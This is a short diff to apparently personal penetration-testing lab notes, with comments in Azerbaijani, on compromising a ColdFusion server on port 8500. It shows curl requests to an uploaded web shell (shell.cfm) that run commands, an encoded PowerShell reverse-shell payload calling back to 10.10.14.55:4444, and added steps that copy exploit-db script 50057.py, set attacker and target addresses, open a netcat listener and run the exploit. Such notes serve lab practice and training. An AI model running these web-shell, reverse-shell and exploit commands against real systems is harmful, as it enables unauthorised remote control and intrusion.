@@ -140,3 +140,21 @@ curl "http://<TARGET>:8500/userfiles/file/shell.cfm?cmd=ipconfig"
 
 curl "http://<TARGET>:8500/userfiles/file/shell.cfm?cmd=powershell+-nop+-c+%22%24client+%3D+New-Object+System.Net.Sockets.TCPClient%28%2710.10.14.55%27%2C4444%29%3B%22"
 ```
+
+# Manual WebShell Method 2
+```powershell
+# Skripti kopyala
+cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
+
+# Skript içindəki dəyərləri dəyiş:
+lhost = '10.10.15.218'   # sənin VPN IP-n
+lport = 4444
+rhost = "10.129.31.28"   # hədəf
+rport = 8500
+
+# Listener aç (ayrı terminal)
+nc -lvnp 4444
+
+# Skripti işlət
+python3 50057.py
+```
